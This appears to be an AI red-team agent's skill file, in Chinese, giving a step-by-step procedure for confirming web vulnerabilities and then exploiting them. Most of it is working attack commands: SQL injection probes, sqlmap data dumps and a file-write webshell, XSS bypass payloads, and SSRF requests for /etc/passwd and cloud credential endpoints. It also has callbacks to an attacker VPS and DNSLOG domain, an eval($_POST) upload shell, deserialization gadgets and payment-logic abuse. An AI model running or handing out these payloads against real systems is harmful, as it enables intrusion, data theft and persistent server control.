---
name: web-vuln-verification
description: Web 漏洞手工验证：SQL 注入 / XSS / SSRF / 文件上传 / 越权 / 反序列化 / 逻辑漏洞的判定 payload、绕过手法与证据固化
whenToUse: 目录爆破或接口提取后，拿到"疑似漏洞点"（报错、参数回显、上传点、ID 参数、序列化 Cookie）；需要把 confidence 从 suspected 升到 confirmed 时
role: vuln-scan
enabled: true
---

# Web 漏洞手工验证（把"疑似"变成"确认"）

**扫描器只报"可能"**：nuclei 命中的是模板特征，不是业务漏洞。这一条技能只做一件事——
把每个疑似点用**最小 payload**打到能复现，并且留下**原始请求/响应**，否则不算发现。

判定一个点"确认"的三个条件（缺一条就只能记 `suspected`）：

1. **有差异**：payload 与等价无害基线（把 `'` 换成 `''`、把 `1=1` 换成 `1=2`）的响应不同；
2. **可复现**：同参数、同请求、重放 3 次结果一致（随机化参数值，排除缓存/巧合）；
3. **非破坏**：验证阶段不写文件、不删数据、不改配置（写操作留到 exploit 角色）。

## 〇、开工前的三次只读动作

```bash
# 1) 这个参数原来长什么样（基线）
curl -sS -o base.txt -w '%{http_code} %{size_download}\n' 'http://<target>/PATH?PARAM=1'
# 2) 页面里有没有回显位（先定位再谈注入）
curl -sS 'http://<target>/PATH?PARAM=1' | grep -o 'PARAM=[^&"]*' | head
# 3) 有没有 WAF / 拦截页（403/406/自定义拦截页先记下，后面所有 payload 都要对比它）
curl -sS -D - -o /dev/null 'http://<target>/PATH?PARAM=1%27' | head -20
```

> 所有请求一律 `-o runs/<host>-<point>.txt -D runs/<host>-<point>.hdr` 落盘，
> 后面 `redteam_http_evidence_add` 直接贴着两份文件写 `request`/`response`。

## 一、SQL 注入（先判定类型，再决定工具）

```bash
# 报错型：单引号 → 数据库报错（错误信息本身就泄露了 DBMS 与版本）
curl -sS "http://<target>/PATH?id=1%27"

# 布尔型：两次等价对比，页面长度/关键字差异就是注入点
curl -sS "http://<target>/PATH?id=1%20and%201=1--%20-" -o a.txt -w '%{size_download}\n'
curl -sS "http://<target>/PATH?id=1%20and%201=2--%20-" -o b.txt -w '%{size_download}\n'
diff <(wc -c < a.txt) <(wc -c < b.txt)

# 时间型（前两种都无回显时）：数据库不同函数不同，别乱试
curl -sS "http://<target>/PATH?id=1%20and%20sleep(3)--%20-" -w ' %{time_total}\n'   # MySQL
curl -sS "http://<target>/PATH?id=1;waitfor%20delay%20'0:0:3'--" -w ' %{time_total}\n' # MSSQL
curl -sS "http://<target>/PATH?id=1%20and%201=(select%201%20from%20pg_sleep(3))--" -w ' %{time_total}\n' # PG
```

确认后再上工具（**一定要限速 + 限定库/表，别全库拖**）：

```bash
sqlmap -u "http://<target>/PATH?id=1" --batch --random-agent \
  --level 2 --risk 2 --threads 4 --delay 1 \
  --dbs                          # 先看有哪些库
sqlmap -u "http://<target>/PATH?id=1" --batch -D <db> --tables
sqlmap -u "http://<target>/PATH?id=1" --batch -D <db> -T <table> --dump --where="1=1 LIMIT 100"
# POST / JSON / Cookie 注入点：把请求存成文件，比手拼参数稳
sqlmap -r runs/req.txt --batch --level 2 --risk 2
```

写文件 getshell（**先确认 `@@secure_file_priv` 为空、`@@version_compile_os` 是 Linux**）：

```bash
sqlmap -u "http://<target>/PATH?id=1" --batch --file-write=runs/shell.php \
  --file-dest=/var/www/html/shell.php
```

- 只读优先：`--dbs` / `--tables` / `--dump --where` 定量；**不要 `--dump-all`、不要 `--os-shell` 先手**。
- 数据量要如实统计（≥100 万条才是"大量敏感信息"得分点）：`select count(*) from <table>` 落进 evidence。

## 二、XSS（反射 / 存储 / DOM）

```bash
# 反射：先看字符被不被转义
curl -sS 'http://<target>/search?q=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'
# 常见绕过顺序：大小写 → 双写 → HTML 实体 → JS unicode → 属性逃逸 → 模板注入探测
```

| 场景 | 验证 payload |
| --- | --- |
| 标签内文本 | `<script>alert(document.domain)</script>` |
| 属性值内 | `"><img src=x onerror=alert(1)>` |
| JS 字符串内 | `'-alert(1)-'` / `\';alert(1);//` |
| href/src | `javascript:alert(1)` |
| 过滤了尖括号 | `<img src=x onerror=alert(1)>` / `<svg onload=alert(1)>` |
| 只过滤 `script` | `<scr<script>ipt>alert(1)</script>` |
| 富文本/编辑器 | `<iframe srcdoc="<script>alert(1)</script>">` |

**存储型才是得分点**：反射型 XSS 只在你自己浏览器里弹，存储型才可能打到管理员。
验证方式：把 payload 提交到留言/昵称/工单/文件名，再用**另一个会话**打开后台列表页确认执行。

拿到后台 Cookie 的价值判定：Cookie 里有 `JSESSIONID`/`SESSION` 且后台无二次校验 → 记
`account-admin`（**不能只写"有 XSS"，要真登进后台**）。

## 三、SSRF（内网跳板与云元数据）

```bash
# 1) 基础回连（先证明"目标替你发了请求"）：用你有日志的端口
curl -sS "http://<target>/fetch?url=http://<你的VPS>:9000/ssrf-probe"
# 2) 内网探测：看响应时间差与报错差异（不要扫全网段，只打常见端口）
for p in 80 6379 3306 9200 2375 8080; do
  curl -sS -m 5 -o /dev/null -w "$p %{http_code} %{time_total}\n" \
    "http://<target>/fetch?url=http://127.0.0.1:$p/"
done
# 3) 协议扩展：file / gopher / dict
curl -sS "http://<target>/fetch?url=file:///etc/passwd"
curl -sS "http://<target>/fetch?url=gopher://127.0.0.1:6379/_INFO"
# 4) 云元数据（阿里/腾讯走 100.100.100.200，AWS 走 169.254.169.254）
curl -sS "http://<target>/fetch?url=http://100.100.100.200/latest/meta-data/"
curl -sS "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

无回显时用 DNS 外带（`<random>.<你的域名>`，看 DNS 日志即可确认）：

```bash
curl -sS "http://<target>/fetch?url=http://$(date +%s).<你的DNSLOG域名>/"
```

SSRF 的得分价值在**跳板**：能打内网 Redis/Docker/K8s 才算 `internal` 阶段的入口，单纯"能访问 127.0.0.1"
只记一条中危漏洞。

## 四、文件上传（从"能传"到"能执行"）

```bash
# 1) 正常上传一次，记下响应里的路径（很多站回显 URL）
curl -sS -F 'file=@runs/a.png' 'http://<target>/upload' | tee runs/upload.json
# 2) 逐个维度绕过（一次只改一个维度，才知道是哪个校验弱）
#    a. 扩展名：shell.php / shell.php5 / shell.phtml / shell.jsp / shell.jspx / shell.aspx
#    b. 双写：shell.php.jpg / shell.jpg.php / shell.php%00.jpg / shell.php.
#    c. Content-Type：image/png
#    d. 魔术字节：GIF89a 开头 + php 代码（图片马）
printf 'GIF89a<?php @eval($_POST["c"]);?>' > runs/shell.gif.php
# 3) 解析验证（关键一步）：传到能解析的目录，直接访问看是否执行
curl -sS 'http://<target>/upload/shell.gif.php' -d 'c=echo%20UPLOAD_OK;' | grep UPLOAD_OK
```

常见组合拳：

- **.htaccess / web.config 覆盖**：先传 `.htaccess`（`AddType application/x-httpd-php .jpg`），再传 `shell.jpg`；
- **二次渲染**：头像类上传会重绘图片 → 改传 SVG（`<svg onload>`）或打压缩包解压（zip 目录穿越）；
- **解析漏洞**：Nginx `shell.jpg/1.php`、IIS `shell.asp;.jpg`、Apache `shell.php.xxx`（旧版）。

拿到可执行文件即 `server-host` 候选：**必须换成冰蝎/哥斯拉马并实测用户能连**（技能 `webshell-toolkit`），
一句话马不算交付。

## 五、越权 / 未授权（最容易被扫出来、也最容易漏记）

```bash
# 1) 无凭证直连：把 Cookie/Token 整个删掉再请求一次
curl -sS -o /dev/null -w '%{http_code}\n' 'http://<target>/api/user/list'
# 2) 换身份：A 的 Token 访问 B 的资源（IDOR）
curl -sS -H "Authorization: Bearer <低权token>" 'http://<target>/api/user/1002/profile'
# 3) 改参数：id / uid / userId / tenantId / orgId 逐个替换（一次只改一个）
# 4) 方法降级：GET→POST、POST→PUT、加 X-HTTP-Method-Override: PUT
# 5) 路径变体：/api/user/1002 → /api/user/1002/ → /api//user/1002 → /api/user/1002%00
```

判定口径：

- **未授权**：无凭证能拿业务数据（200 + 真实数据）→ 记 `unauthorized`，通常是中高危；
- **越权**：低权能拿高权/他人数据 → 记 `auth-bypass`；**必须截图/贴响应证明拿到了别人的数据**；
- **批量枚举**：能遍历用户/订单且无频率限制 → 记"信息泄露"，但要**限速并抽样**（10~20 条即可），
  不要全量拖库。

## 六、反序列化 / 表达式注入（先探通，再谈利用）

特征：Cookie 或参数是 base64 的二进制、`rO0AB`（Java 序列化）、`__VIEWSTATE`、`data=`、`token=`。

```bash
# 无回显探测：把 gadget 的回连点指向 DNSLOG，看有没有解析
curl -sS -H "Cookie: rememberMe=<payload>" 'http://<target>/' -o /dev/null
# 有回显探测（表达式注入）：算术表达式优先，能算对就说明表达式被执行
curl -sS "http://<target>/calc?expr=7*7"      # 期望回 49
```

- Java：ysoserial（CommonsBeanutils1 / CommonsCollections5 / Jdk7u21）+ 目标依赖判断；
- PHP：`phpggc`（Laravel/Symfony/Guzzle 链）；
- .NET：`ysoserial.net`（ViewState / BinaryFormatter）；
- 表达式注入（SpEL/OGNL/MVEL/EL）：先 `7*7`、`"a".concat("b")`，再 `T(java.lang.Runtime)`。

**探测阶段绝不执行破坏性命令**（`rm`、`shutdown`、`drop`）。回连只用 `curl <你的VPS>` / `ping`。

## 七、逻辑漏洞（得分密度高，扫描器覆盖不到）

1. **验证码**：删掉 `code` 参数、固定同一个 code 复用 100 次、验证码只在前端校验；
2. **密码重置**：token 可预测（时间戳/MD5(手机号)）、响应里回带 token、改 `phone` 收别人短信；
3. **支付**：金额改 0.01、数量负数、优惠券叠加、并发重复提交（`&` 跑 20 次看是否多发货）；
4. **注册/邀请**：覆盖注册（`userId` 已存在时改密码）、邀请码爆破、邮箱后缀白名单绕过；
5. **权限提升**：注册时提交 `role=admin`、个人信息接口回写 `isAdmin`。

每条都要留**可复现的最小步骤**（几步请求 + 结果），否则不算确认。

## 八、落库与交接（强制）

1. 每条确认的漏洞先落库：`redteam_vuln_add`
   - `title` 写"组件 + 漏洞类型 + 参数"（`Shiro rememberMe 反序列化`、`/api/user id 越权`）；
   - `target` **带端口**；`severity`、`confidence=confirmed`、`evidence` 贴**关键回显**；
   - `gained` 写实际拿到什么（`db-access` / `account-admin` / `server-host` / `跳板`）。
2. 原始请求 + 响应：`redteam_http_evidence_add`（`request` 贴 curl 或原始报文，`response` 贴头部 + 关键 body）。
3. 每步动作 `redteam_chain_add`（`stage_code=internet`，`tool` 写实际命令、`result` 写回显摘要）。
4. 测完立刻 `redteam_asset_test` 回写 `status=tested`、`surface` 写"哪些参数/入口已测、结论"，
   避免后续角色重复打。
5. 只有"实测成功"的才升 `confirmed`；没打通但特征明确的记 `suspected` 并写清缺什么条件。
